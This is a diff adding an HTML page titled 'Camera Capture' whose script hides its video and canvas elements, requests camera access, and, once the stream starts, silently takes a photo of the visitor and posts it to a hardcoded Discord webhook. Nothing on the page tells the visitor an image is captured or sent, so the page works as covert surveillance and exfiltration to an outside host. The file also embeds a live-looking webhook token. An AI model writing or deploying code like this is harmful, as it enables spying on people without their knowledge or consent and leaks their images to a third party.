@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera Capture</title>
+</head>
+<body>
+    <video id="video" autoplay style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        // Discord webhook URL (replace with yours)
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1320376121572724777/ZwPWtXeYwYDQ9tH-H4TAHl_Vv2YVwbLo90oRI8ojgNVWH3PjTavwrPPbtTmdwf7RwIL7";
+
+        // Request camera permissions and start video stream
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then((stream) => {
+                video.srcObject = stream;
+
+                // Automatically capture a photo after the video stream starts
+                video.onloadedmetadata = () => {
+                    captureAndSendPhoto();
+                };
+            })
+            .catch((error) => {
+                console.error('Camera access denied!', error);
+            });
+
+        function captureAndSendPhoto() {
+            // Draw the video frame onto the canvas
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Convert the canvas content to an image (Blob)
+            canvas.toBlob((blob) => {
+                const formData = new FormData();
+                formData.append('file', blob, 'photo.png');
+
+                // Send the photo to the Discord webhook
+                fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    body: formData,
+                })
+                    .then((response) => {
+                        if (response.ok) {
+                            console.log('Photo sent successfully!');
+                        } else {
+                            console.error('Failed to send photo.', response.status);
+                        }
+                    })
+                    .catch((error) => {
+                        console.error('An error occurred while sending the photo.', error);
+                    });
+            });
+        }
+    </script>
+</body>
+</html>
